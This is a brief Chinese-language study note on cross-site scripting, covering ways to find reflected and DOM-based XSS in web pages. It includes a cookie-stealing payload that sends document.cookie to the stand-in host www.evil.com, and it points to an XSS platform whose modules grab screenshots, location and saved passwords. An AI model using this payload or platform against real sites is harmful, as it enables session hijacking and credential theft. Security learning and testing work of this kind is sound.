## XSS知识总结

### 1.XSS利用技巧
1. 利用XSS远程窃取Cookie敏感信息：
	`eval(‘new Image().src=“http://www.evil.com/steal.php?c=“+escape(document.cookie)')
`

2. XSS平台：https://xsspt.com/index.php?do=user&act=seting  

	XSS平台，提供多种攻击利用的模块，通过自动生成代码利用：  
	1. JS攻击  
	2. 经纬度获取  
	3. 获取网页截屏 
	4. 获取保存的明文密码

### 2.XSS发现技巧
1. 反射型xss查找技巧：  

	反射型XSS如果知道URL中的参数，再进行渗透测试时，直接对参数进行遍历即可发现存在XSS漏洞的参数。针对没有明显显示参数的请求，进行反射型XSS时，则需要一些特殊手段，去查找可能存在问题的参数。  
	1. 针对DOM型的反射型XSS，寻找需要利用一些技巧，一般都需要存在document.write()、innerHtml= 等。  
	2. 检查响应的JS文件，存在document.getElementByID()、document.getElementByName()操作的参数   
	3. input类型输入框参数的尝试：当检查input输入框HTML源代码，当存在value属性时，意味着开发者可能想自动填充该值，可能存在反射型xss。   
	可能存在问题的写法：  
	`<input id="phoneType" class="inputType" type="text" maxlength="30" value="">`  
	一般的写法：  
	`<input id="telephone" class="inputType" type="text" maxlength="20">`
	经过验证，存在value属性的input，会自动填充值：  
	`<input id="phoneType" class="inputType" type="text" maxlength="30" value="js_attack">`  
	
		

3. going on...